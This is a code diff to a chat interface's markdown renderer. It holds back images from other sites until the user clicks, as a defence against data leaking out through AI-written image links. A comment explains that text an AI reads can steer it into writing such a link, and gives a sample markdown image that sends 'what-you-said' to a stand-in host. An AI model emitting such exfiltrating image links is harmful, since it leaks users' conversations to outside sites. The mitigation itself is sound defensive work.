@@ -64,7 +64,19 @@
 
   // ===================================================== markdown + code
   if (window.DOMPurify) {
+    // A picture from another site is not loaded by itself. Loading it tells that
+    // site something, and text the AI was fed (a web page, a file, a tool result)
+    // can make it write a picture address that carries your data away, like
+    // ![](https://somewhere.example/?q=what-you-said). The address is kept aside
+    // and renderMD puts a button in its place; the picture loads on a click.
+    const ownPicture = (src) => /^(\/(?!\/)|data:image\/|blob:)/i.test(src);
     DOMPurify.addHook("afterSanitizeAttributes", (n) => {
+      if (n.tagName === "IMG") {
+        n.removeAttribute("srcset");
+        const src = n.getAttribute("src") || "";
+        if (src && !ownPicture(src)) { n.setAttribute("data-held-src", src); n.removeAttribute("src"); }
+        return;
+      }
       if (n.tagName !== "A") return;
       const href = n.getAttribute("href") || "";
       if (href.startsWith("/") && !href.startsWith("//")) return; // links inside Knitnox stay in this tab
@@ -154,10 +166,40 @@
     btn.innerHTML = `${ICON_CHECK}${label ? "<span>Copied</span>" : ""}`;
     setTimeout(() => { btn.classList.remove("is-copied"); btn.innerHTML = `${ICON_COPY}${label ? "<span>Copy</span>" : ""}`; }, 1600);
   }
+  // Pictures from other sites the reader chose to show stay shown while the
+  // page is open (an answer is drawn again many times while it streams).
+  const shownPictures = new Set();
+  function showHeld(btn, src, alt) {
+    const img = document.createElement("img");
+    img.src = src; img.alt = alt || ""; img.loading = "lazy"; img.referrerPolicy = "no-referrer";
+    btn.replaceChildren(img);
+  }
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest?.("button.held-img[data-held-src]");
+    if (!btn) return;
+    shownPictures.add(btn.dataset.heldSrc);
+    const holder = document.createElement("span");
+    showHeld(holder, btn.dataset.heldSrc, btn.dataset.alt);
+    btn.replaceWith(holder.firstChild);
+  });
   function renderMD(el, raw) {
     el._raw = raw;
     if (window.marked && window.DOMPurify) {
-      el.innerHTML = DOMPurify.sanitize(marked.parse(raw, { gfm: true, breaks: true }), { FORBID_ATTR: ["style"] });
+      el.innerHTML = DOMPurify.sanitize(marked.parse(raw, { gfm: true, breaks: true }), { FORBID_ATTR: ["style", "background", "poster"] });
+      for (const img of $$("img[data-held-src]", el)) { // pictures from other sites wait for a click
+        const src = img.dataset.heldSrc;
+        let host = "another site";
+        try { host = new URL(src).hostname || host; } catch { /* not an address: the button says so */ }
+        const btn = document.createElement("button");
+        btn.type = "button";
+        btn.className = "held-img";
+        if (shownPictures.has(src)) { showHeld(btn, src, img.alt); img.replaceWith(btn.firstChild || btn); continue; }
+        btn.dataset.heldSrc = src;
+        btn.dataset.alt = img.alt || "";
+        btn.title = src;
+        btn.textContent = `Show picture from ${host}`;
+        img.replaceWith(btn);
+      }
       enhanceCode(el);
       for (const table of $$("table", el)) { // wide tables scroll instead of breaking the layout
         if (table.parentElement.classList.contains("table-wrap")) continue;
